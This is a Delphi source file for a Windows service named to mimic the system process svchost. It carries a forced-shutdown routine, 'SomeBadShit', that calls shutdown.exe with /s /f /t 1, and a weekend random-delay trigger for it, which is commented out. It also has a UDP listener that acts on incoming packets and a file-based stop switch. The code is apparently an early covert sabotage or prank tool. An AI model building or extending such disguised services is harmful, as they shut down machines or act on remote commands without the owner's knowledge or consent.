unit uMain;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, SvcMgr, Dialogs,
  shellapi, IdSocketHandle, IdUDPServer, IdBaseComponent, IdComponent, IdUDPBase;

type
  Tsvchost111 = class(TService)
    IdUDPServer1: TIdUDPServer;
    procedure ServiceExecute(Sender: TService);
    procedure IdUDPServer1UDPRead(AThread: TIdUDPListenerThread; AData: TBytes;
      ABinding: TIdSocketHandle);
  private
    { Private declarations }
  public
    function GetServiceController: TServiceController; override;
    { Public declarations }
  end;

var
  svchost111: Tsvchost111;

implementation

{$R *.DFM}

var
  work: boolean = true;
  dow: integer;
  last_now: extended;
  rnd: integer;
  i: integer;

procedure SomeBadShit;
begin
  shellexecute(0, 'open', 'c:\windows\system32\shutdown.exe', '/s /f /t 1', 'c:\windows\system32\', 0);
end;

procedure Tsvchost111.IdUDPServer1UDPRead(AThread: TIdUDPListenerThread;
  AData: TBytes; ABinding: TIdSocketHandle);
var
  f: textfile;
begin
  if adata[0] = 10 then
  begin
    assignfile(f, 'd:\qwe.txt');
    rewrite(f);
    writeln(f, 'qweqwe');
    closefile(f);
  end;
end;

procedure Tsvchost111.ServiceExecute(Sender: TService);
var
  f: textfile;
  count: integer;
begin
  last_now := now;
  randomize;
  rnd := random(60);
  count := 0;

  work := true;
  while work and not Terminated do
  begin

    sleep(1000);
    count := count + 1;

    if count = 5 then
    begin
      if FileExists('d:\stop.txt') then
      begin
        // DeleteFile('d:\stop.txt');
        work := false;
        Self.DoShutdown;
      end;
      count := 0;
    end;

//    dow := DayOfWeek(now);
//    if (dow = 1) or (dow = 7) then // sunday or saturday
//      if (now - last_now) * 24 * 60 > (60 + rnd) then
//        SomeBadShit;

    ReportStatus;
    ServiceThread.ProcessRequests(false);
  end;
end;

procedure ServiceController(CtrlCode: DWord); stdcall;
begin
  svchost111.Controller(CtrlCode);
end;

function Tsvchost111.GetServiceController: TServiceController;
begin
  Result := ServiceController;
end;

end.
